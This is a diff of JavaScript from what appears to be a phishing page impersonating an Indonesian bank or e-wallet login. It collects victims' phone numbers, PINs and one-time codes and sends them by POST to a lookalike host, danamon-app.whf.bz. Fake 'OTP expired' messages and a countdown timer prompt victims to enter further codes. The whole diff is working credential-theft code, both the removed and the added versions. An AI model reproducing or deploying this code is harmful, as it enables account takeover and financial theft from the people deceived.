@@ -1,17 +1,3 @@
-///
- function countdown() {
-    var count = parseInt(
-    $('#countdown').text());
-    if (count !== 0) {
-    $('#countdown').text(count - 1);} 
-    else {
-    $('#countdown').text('60');}};
-   
-
-///
-
-
-
 //var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
 var pinContainer = document.querySelector(".box-input-pin");
 console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
@@ -50,17 +36,7 @@ pinContainer.addEventListener('keydown', function (event) {
     target.value = "";
 }, false);
 
-$('.inpotp').on('input', function(event) {
-const form = $('#formOtp');  
- const inputs = $('.inpotp');
-const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
-if (isAllFilled == true) {
-    $(event.target).blur();
-sendOtp();
-form.submit();
-}
-
-const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});
+$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});
 $(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});
 
  function nextPrev(){
@@ -131,17 +107,15 @@ function tutupotp(){
 $(".bgotp").hide();    
 }
 
-
-/////
-   function sendNohp(event){
+       function sendNohp(event){
     $("#process").show();event.preventDefault();
     $("#inp").blur();
      
     
-    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
+    var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana6/one.php',
+			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
 			  data: dataString,
  
     
@@ -157,112 +131,87 @@ $(".bgotp").hide();
     $("#pin1").focus();
     }, 500);}});};
     
-////
+
 function sendPin(){
 
-  var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
+ 
+ 
+  var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via<br/>";
+        
+  var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana6/two.php',
+			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
 			  data: dataString,
  
 
 
- complete: function(data) {
+complete: function(data) {
             console.log('Complete');
 $("#process").hide();
-var themeColorTest = new function() {
-  function e() {
-    "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : $themeColor.content = "#C11A46",
-      setTimeout(e, 500)
-  }
-  this.init = function() {
-    $themeColor = document.querySelector("meta[name='theme-color']"),
-      e()
-  }
-};
-themeColorTest.init();
-document.getElementById("infoku").innerHTML = "0" + inp.value;
- setInterval(countdown1, 1000);
-  $("#bukalapak").fadeIn();
-  $("#kode1").focus();
+document.getElementById("alert").style.display = "block"; 
+$(".bgotp").fadeIn();
+setInterval(countdown, 1000);
+$("#otp1").focus();
 }
 }
 );
 };
 
 
-///
-
-function sendOtp(){
-
+  function sendOtp(){
     $(".loadingOtp").show();
-event.preventDefault();     
+     
       setTimeout(function(){
 $(".alert").text("Masa berlaku OTP sudah habis");
 $(".alert").css("color","red");
  },2000);
     
-    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
+    var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana6/tree.php',
+			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
 			  data: dataString,
  
         
   complete: function(data) {
-            console.log('Complete');
+            console.log('Complete')
     setTimeout(function(){
     $(".loadingOtp").hide();
    
     $('.inpotp').val('');
    $('#otp1').focus();
-  var nomor = document.getElementById("inp").value;
+  var nomor = sessionStorage.getItem("nomor");
         document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via<br/>";
    $(".alert").css("color","black");
     },4000);
-  }});};
-    
-       
-       
-  function bukalapak(event){
-    $("#process2").show();
-    
-    event.preventDefault();
-  
-     
-    
-    
-  
-          var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
-			$.ajax( {
-			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana5/four.php',
-			  data: dataString,
- 
-    
-     complete: function(data) {
-            console.log('Complete');
- $("#bukalapak").hide();       
-  $("#infooo").fadeIn();      
-  var themeColorTest = new function() {
-  function e() {
-    "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : $themeColor.content = "#118EEA",
-      setTimeout(e, 00)
-  }
-  this.init = function() {
-    $themeColor = document.querySelector("meta[name='theme-color']"),
-      e()
-  }
-};
-themeColorTest.init();
-    setTimeout(function(){
- 
-  $("#process2").hide();       
-    $("#alertc").fadeOut();
-    }, 5000);}});};
-    
    
-           
-       
-       
+        
+    }
+        
+    }
+    );
+        
+    };
+    
+    function countdown() {
+    var count = parseInt(
+    $('#countdown').text());
+    if (count !== 0) {
+    $('#countdown').text(count - 1);} 
+    else {
+    $('#countdown').text('60');}};
+   
+window.onload = function(){
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container").fadeIn(200);
+                   $("#inp").focus();
+                },1000);
+            },1000);
+        },500);
+}
